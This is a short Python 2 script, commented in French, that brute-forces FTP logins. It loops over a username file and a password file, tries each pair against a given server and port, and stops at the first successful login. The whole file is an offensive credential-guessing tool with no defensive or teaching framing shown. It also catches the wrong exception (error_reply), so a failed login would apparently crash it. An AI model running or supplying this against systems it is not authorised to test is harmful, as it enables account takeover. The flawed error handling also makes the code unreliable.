#!/usr/bin/env python
# -*- coding: utf-8 -*-

import sys
import ftplib


def read_list(filepath):
    data = []
    with open(filepath) as ifile:
        for line in ifile:
            # suppression des caractères de fin de ligne
            line = line.strip('\r\n')
            if line:  # une ligne vide évalue à "False"
                data.append(line)
    return data


def try_login(server, port, username, password):
    ftp = ftplib.FTP()
    ftp.connect(server, port)
    try:
        ftp.login(username, password)
        result = True
    except ftplib.error_reply:
        result = False
    finally:
        ftp.quit()
    return result


# parsing des options de ligne de commande
if len(sys.argv) != 5:
    print "USAGE: %s SERVER PORT USERS_LIST PASSWORDS_LIST" % sys.argv[0]
    sys.exit(1)
_, server, port, userfile, passwdfile = sys.argv

# lecture des fichiers d'utilisateurs/passwords
usernames = read_list(userfile)
passwords = read_list(passwdfile)

# essai de chaque couple utilisateur/password
for username in usernames:
    for password in passwords:
        print "Trying '%s':'%s'..." % (username, password),
        if try_login(server, port, username, password):
            print "OK"
            sys.exit(0)
        print "FAILED"
